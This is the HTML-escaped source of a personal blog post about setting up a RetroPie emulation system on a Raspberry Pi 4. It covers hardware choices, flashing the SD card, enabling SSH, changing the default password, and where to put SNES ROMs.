    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 77.84810126582278%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAADM0lEQVQ4y4WUa0hUWxiGd7/6ExREF43MLmak021qUsrAIiRIoqgQSerH6dRAZWU3ybTQ1PRMgRkWhPWjzDTNLqeIk2lUWnYhI0rTbs7FS+reas7oODPP2XtPM2cG8fTCYn977bXe7/3W+60t8D9wuVzq8MTPap7T0PCJtrYOTOZWLJY2jCYz1dVPEEVJXSf8jtDhcKhxVVU1c8MWEr0yhvD5OkLDljAnfDHLo1YSvjCCjJPZbkKPipGGh/DgoWTmzV/C0ogops+YzcRJgQQEBqHVRqLTRbFu7Xokqec/hS6X06tMIfGUqsBut7M5bguTAoIInaNBo9EyZsw4pgQGs2CBjpBQDbNmh1Nf/w5B2axsUDBgtzFks7oTyKOnpweX08n3lhaWyaVNmDwVvX43ubkGLhWXkFd4iaMpaWgXRzJRTlZWfhNBkiT6+22YWs0UVZaRnp9J2d0bdHe0I8rflIQWSyszQuaySBvB4K/k1L3CUVKuhsdSTyCMGk1FxW13yUZLE3GJ21h7JoWjBacI2hDNn8eT+FT3gi+NDeqmYllRZdVjdyVXi5CiY8gOnUnKkSRajCbyzxWgiBOU0rq62im8fpn47MPoNqxhRdx6cgxZHEhK5sH9e76207H/IJZNG9kXuYhpweNITTnk1xmCck4Oh9uQzrZWck+nk555mIuGHCr+vq/O9/X1MWQfUuPGK0WsCglmfMBYduzQe4kGB+2qkYLHVVESsdps6sd20cL7j/Vq3NvbK59xvxqbWkwMys+rpaWcSE3zkjmdTm/fCp4Jq9XKwMAAktzxr+ve0tf706/BFTQ1NlF44SJncv5i7+495OedHXajBN+rpeDp41oSNm/nj627uFFc7u1LBc1Nzei37+Tb12+q8oT4LdQ+q/FbI/iSKaWlJWeSqD/Cxth4YlfH0tXZ5VVa/aiKUtltD2qf1nBHbpURCZXSC/IuEBMdS9hMDRlp6eq8x5BXdS/ZtysRsVtU38/nF9Dw4aPfOQq+103Bm9dvuFV+i9OnDBiNRr/FFrOZyn8eYsjJJSsji5Jr14efoa/Czh+d1L99N+Iv7HPzZ9k8dyeI3d3DTFPwLw3uKnCHLoNJAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;RetroPie Equipment&quot;
        title=&quot;RetroPie Equipment&quot;
        src=&quot;/static/03bf06332eba03d7a691dcfb1c899d73/f058b/raspberry-pi-stuff.png&quot;
        srcset=&quot;/static/03bf06332eba03d7a691dcfb1c899d73/c26ae/raspberry-pi-stuff.png 158w,
/static/03bf06332eba03d7a691dcfb1c899d73/6bdcf/raspberry-pi-stuff.png 315w,
/static/03bf06332eba03d7a691dcfb1c899d73/f058b/raspberry-pi-stuff.png 630w,
/static/03bf06332eba03d7a691dcfb1c899d73/40601/raspberry-pi-stuff.png 945w,
/static/03bf06332eba03d7a691dcfb1c899d73/78612/raspberry-pi-stuff.png 1260w,
/static/03bf06332eba03d7a691dcfb1c899d73/a3a5c/raspberry-pi-stuff.png 1277w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;There are lots of tutorials about building a RetroPie, and everyone uses slightly different equipment. There are lots of recommendations to get a bundled pack - a good choice, but I am quite picky. Here is my rationale for each item:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Raspberry Pi 4 Model B - 8GB&lt;/strong&gt;: The only Raspberry Pi I currently has a version 2. I wanted more grunt - mainly to be able to emulate PlayStation 1 games. So I went with a new Pi 4. I also got the 8GB version, the highest RAM option available. The cost difference is not much, and I wanted to squeeze any performance possible out of it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Raspberry Pi 15.3W USB-C Power Supply&lt;/strong&gt;: Why not get a cheaper power adapter from AliExpress. Yes, it would save money. But when it comes to power supplies I want quality. The bonus is that buying the official ones supports the Raspberry Pi Foundation, and they are awesome. So why not.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Micro HDMI to Standard HDMI Cable&lt;/strong&gt;: Since the Pi4 has a micro HDMI output port, I needed a cable to go to my TV. Not much else to say about it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DualShock 4 Wireless Controller&lt;/strong&gt;: RetroPie supports so many controllers that picking one is hard. I looked at many options and picked the PS4 because it is still available from retail shops, has Bluetooth, and I like the style of the controller. Controller support in RetroPie is awesome, so the controller seems like a personal choice.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Sandisk Extreme Pro 64GB&lt;/strong&gt;: It seems sensible to buy a MicroSD with decent speed. I didn’t have any spare MicroSD cards, so I just bought a new one, that had semi-decent capacity. I want to add an SSD in the future, so a massive MicroSD card seemed a waste of money.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;1103-am-initial-installation&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#1103-am-initial-installation&quot; aria-label=&quot;1103 am initial installation permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;11.03 am: Initial Installation&lt;/h2&gt;
&lt;p&gt;Got home with all my new goodies! Time to do some tinkering! I have not had much exposure to using the Raspberry Pi - so I was reading lots of tutorials and blogs along the way. However, the &lt;strong&gt;main documentation I followed&lt;/strong&gt; was the &lt;a href=&quot;https://retropie.org.uk/docs/First-Installation/&quot;&gt;RetroPie First Installation guide&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The first task is to download the RetroPie image and write it to my new flashy MicroSD card. I downloaded the latest RetroPie version: &lt;code class=&quot;language-text&quot;&gt;4.7.1&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The &lt;a href=&quot;https://retropie.org.uk/docs/First-Installation/#installation&quot;&gt;installation instructions on the RetroPie guide&lt;/a&gt; are quite long and have various steps about installing software to write the RetroPie image to the SD card. Great to see such thorough documentation, but on Linux, this is a couple of commands task. I would not recommend following these instructions blindly. This is just a method I used on my Linux system, that I found simple and easy. So I documented them mainly for myself. &lt;strong&gt;Be careful with the &lt;code class=&quot;language-text&quot;&gt;dd&lt;/code&gt; command&lt;/strong&gt;!!!&lt;/p&gt;
&lt;p&gt;Download the RetroPie image:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;wget https://github.com/RetroPie/RetroPie-Setup/releases/download/4.7.1/retropie-buster-4.7.1-rpi4_400.img.gz&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Check the RetroPie MD5 checksum:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;echo &quot;1ea0cbf19991273cc8b50bbca7b52806  retropie-buster-4.7.1-rpi4_400.img.gz&quot; | md5sum -c -&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Copy image to MicroSD card:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo dd bs=4M if=retropie-buster-4.7.1-rpi4_400.img of=/dev/sda conv=fsync&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Next, I remove the MicroSD card and inserted it into my RaspberryPi. Then connected the following cables:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Connected HDMI cable to my TV&lt;/li&gt;
&lt;li&gt;Connected a USB keyboard I had laying around&lt;/li&gt;
&lt;li&gt;Connected my PS4 controller via USB&lt;/li&gt;
&lt;li&gt;Connected the UBS-C cable and powered on the device&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;1241-am-retropie-is-alive&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#1241-am-retropie-is-alive&quot; aria-label=&quot;1241 am retropie is alive permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;12.41 am: RetroPie is Alive!&lt;/h2&gt;
&lt;p&gt;I was anticipating numerous technical issues when first using my new RetroPie system. I did encounter some issues, but they were all pretty minor. The RetroPie system is super easy to use and customize, and very flexible.&lt;/p&gt;
&lt;h3 id=&quot;basic-configuration---wifi-and-ssh&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#basic-configuration---wifi-and-ssh&quot; aria-label=&quot;basic configuration   wifi and ssh permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Basic Configuration - WiFi and SSH&lt;/h3&gt;
&lt;p&gt;In the RetroPie Docs First Installation guide, there is a section on &lt;a href=&quot;https://retropie.org.uk/docs/First-Installation/#wifi&quot;&gt;How to connect to WiFi&lt;/a&gt;. They recommend using the RetroPie Configuration available in EmulationStation. I should have read this guide completely because I didn’t follow this excellent guidance! Instead, I exited EmulationStation to get to the terminal, and connected using the &lt;code class=&quot;language-text&quot;&gt;raspi-config&lt;/code&gt; command. &lt;strong&gt;Lesson learned - the RetroPie configuration option in EmulationStation has a bunch of useful tools to avoid directly using the terminal - including &lt;code class=&quot;language-text&quot;&gt;raspi-config&lt;/code&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;If you want to transfer ROMS to your RetroPie, you have a couple of options. I am a diehard Linux terminal fan, so I wanted to copy ROMS from my laptop, via SSH, to the RetroPie. Either by using the &lt;code class=&quot;language-text&quot;&gt;scp&lt;/code&gt; command or by using &lt;a href=&quot;https://filezilla-project.org/&quot;&gt;FileZilla&lt;/a&gt; under SCP mode (more on that in a little bit). But you need to enable the SSH server on the RetroPie first. I did this by exiting EmulationStation and &lt;strong&gt;starting the SSH service from the terminal. Wrong!&lt;/strong&gt; The easier method is to use the &lt;code class=&quot;language-text&quot;&gt;raspi-config&lt;/code&gt; tool, which is available from the terminal, but more easily available from the EmulationStation menu. The &lt;a href=&quot;https://retropie.org.uk/docs/SSH/#option-2-from-the-retropie-menu&quot;&gt;RetroPie Docs on Enabling SSH from the RetroPie menu&lt;/a&gt; outline how to do this. &lt;strong&gt;Lesson learned - the RetroPie configuration option in EmulationStation has the raspi-config tool.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/51bfc8f86172c65fb7015fde6dfb1dc4/29114/emulationstation-config.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 56.32911392405063%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABTUlEQVQoz6VRy07DMBB0HL/WiVPsxG2SElWoVIRWSNy4wA8g8TuckPg5JH6LSUwf4spkZK3tmd11ljGAc8H5fVlFz9cdizVrI84ygJ+QA1BxrbVSCleTEctCyqDNWC16T9eR1g0NSwolVYYKKa0QVkibc+JZodSCyGlNeT67Gdt03bjb+WX0vra2TEwwxqCUFKK8aur1TolczaWxJC9rYR7HOgSapfOdSpi2xiiRPT6/Pnx8x8OLzJgxdDZ3XXe73dZ1ner8QUpxGO+ePr9u3t5zxvCas3kYhv1+v9lsYowhhMsUiB26d46MamLbtENR2CQ4tt22fd9779E2EV3WdM4h9Wq1giAu8TUQB+/PZhjSK+XMKT4SyWxRXJ6fgt9R4QUlEf5sZa1DkGgMSFKCVqk/JIw6mbGZ/FDPNqv1pMAwlRKMiSybeAqOZP/ED8bPGuLIARYfAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;RetroPie Configuration options available in EmulationStation platform&quot;
        title=&quot;The RetroPie Configuration options available in EmulationStation platform.&quot;
        src=&quot;/static/51bfc8f86172c65fb7015fde6dfb1dc4/f058b/emulationstation-config.png&quot;
        srcset=&quot;/static/51bfc8f86172c65fb7015fde6dfb1dc4/c26ae/emulationstation-config.png 158w,
/static/51bfc8f86172c65fb7015fde6dfb1dc4/6bdcf/emulationstation-config.png 315w,
/static/51bfc8f86172c65fb7015fde6dfb1dc4/f058b/emulationstation-config.png 630w,
/static/51bfc8f86172c65fb7015fde6dfb1dc4/40601/emulationstation-config.png 945w,
/static/51bfc8f86172c65fb7015fde6dfb1dc4/78612/emulationstation-config.png 1260w,
/static/51bfc8f86172c65fb7015fde6dfb1dc4/29114/emulationstation-config.png 1920w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;&lt;p&gt;The RetroPie Configuration options available in EmulationStation platform.&lt;/p&gt;&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;With the RetroPie connected to my WiFi network, and SSH enabled - it makes sense to set a new password and get rid of the default. I couldn’t find an easy way to do this through the RetroPie configuration in EmulationStation (I could be wrong). Instead, I used the terminal and ran the &lt;code class=&quot;language-text&quot;&gt;passwd&lt;/code&gt; command.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo passwd pi&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When you run the command, make sure to enter your new password twice!&lt;/p&gt;
&lt;h3 id=&quot;first-game&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#first-game&quot; aria-label=&quot;first game permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;First Game&lt;/h3&gt;
&lt;p&gt;I had a couple of SNES ROMS sitting around from when I last emulated games on my laptop, so I used one to test. I picked my all-time favorite - Street Fighter II Turbo for the Super Nintendo (or SNES). I copied the ZIP file to the &lt;code class=&quot;language-text&quot;&gt;~/RetroPie/roms/snes&lt;/code&gt; folder and restarted EmulationStation. After restarting, I loaded up the game and was playing a classic retro game.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f087804ace3c1abf2983389ba17c5bb0/21b4d/SF2Turbo.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75.31645569620254%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAAsTAAALEwEAmpwYAAADX0lEQVQoz6XCWW/aBgAAYGuHprWptuZsAjGEMwdXDMQ2NtgBbMDlChgbm3slQMqRtYMwmpBo0ZJ0appFpVWaVmnV6yFttbYs1bSpqrRoe5omTVr3tO5h2h/Z/sM+fQDwf6h1kB1SUaYPFKPyoVHNuFI5PaH2mCQzU1qpTOOYAN1G+awBVKr0I7KpYVAlGTOcPiMbkChPDauA+WKVZ0Pf7o798JB5eifw/BbVve1+dc97tG/vbJY7W6Wjfdt3B/Szm67uPvnipvP7O66lxaASikgNBMAH42GX7UrbWtv4nE4IRhSDcJsJw7Rmc4WDKgmCoD1OD15MhduFQC1BCQwCo6SJiEI4A9QSaD2uaQXflctkH4LTIzpUasCkegw0IpMI7CT0BG6wIVP8nEfkecJhOykzDSsUychsRowCOmWPw/D+GnfCYVbDGMzF/YksJ2ZijVKmIMy3eH/1rF0MGgscfF6wC4zBPGP2kJPpwFRJJABEawrC2i9TPVFUEkDG/DDog6RphyIF61i9lTfjHGTNkRoWkYVgOY8pxVljwaPhbeA5FwhcC8/v8NH1ZE8EG2KsgwIxWAiM5El1xjGRc000nVCNMjY92DWO3s0FzmIyCpVn3dIsLS9QEmCp2LhcL26mTgZIMIiqX5anOwv6EDFAWT/yoQOf6c603eNfMJN3RfLZSkGwDVKG90q+gTLTu0ANAdlSpVRJLZUtnEgGWN9KkqqmmFzc4jT1otax2HR/Gn6n5etpFGP1ZmXR11chgGbw44a/d9EzBBTP09kcms9auCSSieM1Wp8RneU8ziKngi7FJjbYoE+8Wk1ezUdfbF7ayWku8UAr2ltnTl/w9QHzc3g+jOVDtmQQb4RnWn6ozmE1P7qMyzbYmVUjuAyrtgTXp5bRGyFrm9SWtX2V8f7qeH9Z2w+s1VPtenKtkVpppJcX5uoCtZhgDrbO/fSo+vpu4eXVyJPtZOriJ+tO60Uh0Kwln9cjh03+cYM9XOKAp9/sPDrc3nvw1d69jc6t9c6N5pXrF7pH229/+/rPN5f/+Xv17V9rvxwXf+2mX3d3fzza++P44M3P9//7+/FtwEFhdhrD3TaHG8EpbJaxOrwWmiE53svyTjbmZCMuQXQlsoggenjeG2XdbMzLcl42Rv8LrOYSKWPmccgAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Street Fighter II Turbo&quot;
        title=&quot;Street Fighter II Turbo&quot;
        src=&quot;/static/f087804ace3c1abf2983389ba17c5bb0/f058b/SF2Turbo.png&quot;
        srcset=&quot;/static/f087804ace3c1abf2983389ba17c5bb0/c26ae/SF2Turbo.png 158w,
/static/f087804ace3c1abf2983389ba17c5bb0/6bdcf/SF2Turbo.png 315w,
/static/f087804ace3c1abf2983389ba17c5bb0/f058b/SF2Turbo.png 630w,
/static/f087804ace3c1abf2983389ba17c5bb0/40601/SF2Turbo.png 945w,
/static/f087804ace3c1abf2983389ba17c5bb0/78612/SF2Turbo.png 1260w,
/static/f087804ace3c1abf2983389ba17c5bb0/21b4d/SF2Turbo.png 1280w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;In summary, &lt;strong&gt;in approximately 3 hours I had bought all the parts, installed the base system, and was playing Street Fighter II Turbo on a SNES emulator.&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;lessons-learned&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#lessons-learned&quot; aria-label=&quot;lessons learned permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Lessons Learned&lt;/h2&gt;
&lt;p&gt;Instead of including some of the issues I encountered throughout this blog, I decided to make some small subsections about issues I encountered, things I learned as a RetroPie noob, and some pro tips.&lt;/p&gt;
&lt;h3 id=&quot;where-do-i-get-roms-for-my-new-retropie&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#where-do-i-get-roms-for-my-new-retropie&quot; aria-label=&quot;where do i get roms for my new retropie permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Where do I get ROMS for my new RetroPie?&lt;/h3&gt;
&lt;p&gt;It took me a while to find out where to get ROMS. The RetroPie Docs do not state much about this - due to copyright reasons.  Completely understandable, but it makes it difficult as a new user. There is a great article &lt;a href=&quot;https://www.howtogeek.com/262758/is-downloading-retro-video-game-roms-ever-legal/&quot;&gt;Is Downloading Retro Video Game ROMs Ever Legal?&lt;/a&gt; that discusses ROM legality - a good read. I gave away my Master System 2 and PS1 consoles and games (context: I am a bit of a minimalist), so I don’t have the originals. I threw out my working Amiga 500 and games collection when cleaning up my parent’s house (a bad decision in hindsight). I love supporting people who make great stuff by buying their products - but it is really hard to do this easily in the ROM world. It would be amazing if there was a Steam-style ROM provider - but I am dreaming that this is ever going to happen. Anyway, a good place to find ROMs would be reading the pinned message on the &lt;a href=&quot;https://www.reddit.com/r/Roms/&quot;&gt;/r/Roms subreddit&lt;/a&gt;. &lt;strong&gt;The pinned thread is named: Roms Megathread 3.0 Ybin Edition.&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;where-do-i-put-my-roms-in-the-retropie-and-in-what-file-format&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#where-do-i-put-my-roms-in-the-retropie-and-in-what-file-format&quot; aria-label=&quot;where do i put my roms in the retropie and in what file format permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Where do I put my ROMS in the RetroPie and in what file format?&lt;/h3&gt;
&lt;p&gt;This is pretty simple, and probably common knowledge for lots of people. But I found it a little difficult at first. There is a folder in the &lt;code class=&quot;language-text&quot;&gt;pi&lt;/code&gt; user’s home directory called &lt;code class=&quot;language-text&quot;&gt;roms&lt;/code&gt;. In here, there is a bunch of subfolders for different emulators. So the &lt;code class=&quot;language-text&quot;&gt;snes&lt;/code&gt; folder is for Super Nintendo, and the &lt;code class=&quot;language-text&quot;&gt;psx&lt;/code&gt; folder is for PS1 games.&lt;/p&gt;
&lt;p&gt;So we know where to put the ROMS… but what file format should be used? ROMS come in a variety of file formats. Each &lt;strong&gt;Emulators&lt;/strong&gt; section in the RetroPie Docs has extensive information about each specific console/emulator. Let’s use &lt;a href=&quot;https://retropie.org.uk/docs/Super-Nintendo-Entertainment-System/&quot;&gt;SNES&lt;/a&gt; as an example. The SNES emulator accepts a bunch of file types including: &lt;code class=&quot;language-text&quot;&gt;.7z&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;.bin&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;.bs&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;.fig&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;.mgd&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;.sfc&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;.smc&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;.swc&lt;/code&gt;, and &lt;code class=&quot;language-text&quot;&gt;.zip&lt;/code&gt;. I like using archive file formats to save space - especially for emulators which require less processing power, so that decompression will not adversely affect gameplay. From some quick reading it seems some formats are better than others - something I will continue to research.&lt;/p&gt;
